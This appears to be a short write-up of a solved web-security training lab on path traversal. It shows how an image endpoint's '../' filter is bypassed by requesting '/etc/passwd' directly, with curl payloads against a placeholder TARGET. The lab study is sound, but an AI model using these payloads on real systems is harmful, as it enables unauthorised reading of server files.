# File path traversal, traversal sequences blocked with absolute path bypass — Practitioner

**Status:** Solved

---

## Goal

Bypass a filter that blocks `../` sequences by using absolute paths instead to read the `/etc/passwd` file.

---

## Steps (simple & complete)

1. **Find the vulnerable endpoint**
   - Browse any product page and check how images load:
```
   GET /image?filename=12.jpg
```

2. **Test normal traversal**
   - Try basic `../` sequences:
```bash
   curl -s "https://TARGET/image?filename=../../../etc/passwd"
```
   - This fails because the app blocks `../`.

3. **Understand the filter**
   - The app blocks relative path traversal sequences (`../`)
   - But it doesn't validate or block absolute paths.

4. **Use absolute path bypass**
   - Instead of traversing directories, directly specify the full absolute path:
```bash
   curl -s "https://TARGET/image?filename=/etc/passwd"
```

5. **Verify success**
   - If you see the file contents with usernames, the bypass worked.

6. **Lab completion**
   - The lab automatically marks as solved when `/etc/passwd` is successfully retrieved.

---

## Example

- Vulnerable endpoint: `GET /image?filename=12.jpg`
- Working payload:
```bash
curl -s "https://TARGET/image?filename=/etc/passwd"
```

---

**Lab 2 Complete ✓**